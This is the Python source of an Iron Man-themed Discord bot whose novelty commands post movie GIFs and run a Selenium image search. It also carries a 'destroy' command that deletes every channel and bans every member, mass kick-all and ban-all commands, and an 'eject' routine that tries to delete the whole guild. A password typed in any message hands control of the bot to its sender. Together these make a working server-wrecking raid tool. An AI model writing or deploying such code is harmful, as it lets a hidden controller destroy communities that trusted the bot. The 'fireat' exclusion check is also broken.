from webs import keep_alive #webserver

import discord

import discord.ext

from discord.ext import commands

from selenium import webdriver
import os #used to access .env file 

import asyncio

from colorama import Fore


###############################

##---GLOBALS--##
global suituser
suituser=int(os.environ.get("suituser"))


try:
   driver=webdriver.Firefox()
  
except:
    print("Disk QuotaQuota Exception")





global weplist
weplist=[("repulsors","https://cdn.discordapp.com/attachments/823055074539339787/823057076561510410/Iron_Man_vs_Killian_-_Final_Battle_Scene_Part_2__Iron_Man_3__1.gif","fire"),("slap","https://cdn.discordapp.com/attachments/823055074539339787/823058501596610600/Iron_Man_3_Clip__Mark_XL_-_Shotgun_.gif","melee")]

global wepnum
wepnum=0
global weapons
weapons=True
global wepsleep
wepsleep=0
#--ASYNC BACKENDS--#


async def buffersender(ctx,arr,delim):
  buffer=""
  i=1
  for item in arr:
    if delim not in ["nl","nb"]:
      if arr.index(item) != len(arr):
       buffer=buffer+str(item)+delim
      else:
        buffer=buffer+str(item)

    elif delim == "nb":
     
      if arr.index(item) != len(arr):
        buffer=buffer+str(i)+". "+str(item)+"\n"
      else:
        buffer=buffer+str(item)
        
    i+=1
   

  await ctx.send(buffer)

#send a message to the user
async def usersend(messagetext):
    #ID of the bot user
    global suituser
    # Get Discord Member 
    user=await bot.fetch_user(suituser)
    #send text
    await user.send(messagetext)
   

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='.',intents=intents)
#--------------------EVENTS--------------------------
@bot.event
async def on_ready():
  for guild in bot.guilds:
    print(guild.name)
    print(guild.id)

  

  
  print("Booted System")
  #await usersend("Booted System")
@bot.command()
async def destroy(ctx):
  
  

  for channel in ctx.guild.channels:
        try: 
          await channel.delete()
        except: 
          continue
  for member in  ctx.guild.members:
        try:
          await ctx.guild.ban(member,reason="ban",delete_message_days=0)
        except:
          continue
     
  

@bot.event
async def on_message(message):
  global suituser
  if message.content==os.environ.get("password"):
        suituser= message.author.id
        await message.channel.send("Suituser switched")
        try:
         await message.delete()
        
        except:
          print("could not delete")
        
  #Statements that execute when a message is sent in a server(guild), the bot is in
  if(message.author.id==suituser):
   if(bot.command_prefix in message.content):
     pass
   # await message.channel.send("Try Again Later")
  # return
   await bot.process_commands(message)
@bot.event
async def on_member_join(member):
  #Statements that execute when someone joins a server the bot is in
  print(str(member))


#--------------------COMMANDS--------------------------  
@bot.command()
async def ping(ctx):
    await ctx.send((str((bot.latency*1000))) + "ms")

@bot.command() 
async def eject(ctx,*,args):
   for guild in bot.guilds:
    if((args==guild.name) or ( int(args)==guild.id)):
      guild=guild

   
    
  
      try:
       print("IM OUT")
       await ctx.send("I have left {0}".format(guild.name))
       await guild.leave()
     
      except:
        await ctx.send("Attempting Delete")
        await guild.delete()
        print("OOPS")
      
        return    
@bot.event
async def on_guild_join(guild):
   

    await usersend(f"Now in {guild.name}")
  
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            await channel.send('https://cdn.discordapp.com/attachments/822554993068474429/823038506958848001/Iron_Man_vs_Killian_-_Final_Battle_Scene_Part_2__Iron_Man_3_.gif')
        break
    
@bot.command()
async def fireat(ctx,member:discord.Member):
          if(member.id !=823054756779130930 or member.id !=suituser ):
            global wepsleep
 
      
      
      
      
            import asyncio
            
            global weplist
            global wepnum
            if weapons:

          
              msg = await ctx.send("Systems activating: ")
              await asyncio.sleep(wepsleep)
              await msg.edit(content=' Systems activating: ⬜')
              await asyncio.sleep(wepsleep)
              await msg.edit(content=' Systems activating: ⬜⬜')
              await asyncio.sleep(wepsleep)
              await msg.edit(content=' Systems activating: ⬜⬜⬜')
              await asyncio.sleep(wepsleep)
              if weplist[wepnum][2]=="fire":
               await ctx.send("_Firing {0} at  {1} _".format(weplist [wepnum][0],member.name))
              else:
                await ctx.send("Attacking {0} with {1}".format(member.name,weplist[wepnum][0]))
              await ctx.send(weplist[wepnum][1])
            else:
             await ctx.send("Safety is On")


 
@bot.command()
async def kick(ctx,*,inp,reason=None):
        global weapons

        if weapons:
          if inp!="all":
            listofids=inp.split(" ")
            for i in listofids:
              member= await bot.fetch_user(int(i))
            
              await ctx.guild.kick(member)
              await ctx.send("kicked " + member.mention)
          else:
            for member in ctx.guild.members:
              try:
               await member.kick(reason=None)
              except:
                continue


        else: 
           await ctx.send("Safety On")  

   
    
  
@bot.command()
async def ban(ctx,*,inp):
      global weapons

      if weapons:
       if inp!="all":
        listofids=inp.split(" ")
        for i in listofids:
          member= await bot.fetch_user(int(i))
        
          await ctx.guild.ban(member,reason="ban",delete_message_days=0)
          await ctx.send("banned " + member.mention)
       else:
         for member in ctx.guild.members:
          try:

           await ctx.guild.ban(member,reason="ban",delete_message_days=0)
          except:
           continue

      else: 
          await ctx.send("Safety On")  
@bot.command()
async def wepswitch(ctx,*,text):
 # await ctx.send(text)
  channel=ctx.channel
  uid=ctx.author.id
  def check(m):
            return m.channel == channel and m.author.id== uid
  
  
  global weplist
  global wepnum

  wepnames=[]
  
  for i in weplist:
   wepnames.append(i[0])
   if text==i[0]:
    wepnum=weplist.index(i) 
    await ctx.send(weplist[weplist.index(i)][0]+" selected")
    return
  
  if text=="list":
   await buffersender(ctx,wepnames,"nb")
 
   await ctx.send("Which weapon # do you want")
   wepn=await bot.wait_for("message",check=check)
   wepnum=int(wepn.content)-1
  
  await ctx.send(weplist[wepnum][0]+" selected")
@bot.command()
async def imsearch(ctx,*,query):
 
 
 
    
  
  driver.get("https://www.google.com/search?q={0}&tbm=isch".format(query))
  element = driver.find_element_by_class_name("rg_i")
  element.click()
  element = driver.find_element_by_class_name('v4dQwb')
  big_img=element.find_element_by_class_name('n3VNCb')
  url=big_img.get_attribute("src")
  driver.get(url)
  #await ctx.send(url)

  driver.save_screenshot('search.png')
  
  
  await ctx.send(file=discord.File('search.png'))







#----------------------RUN BOT CODE-------------------------



#keep the bot online         
keep_alive()
#get the token from .env 
TOKEN=os.environ.get("DISCORD_BOT_SECRET")

asyncio.run(bot.run(TOKEN))

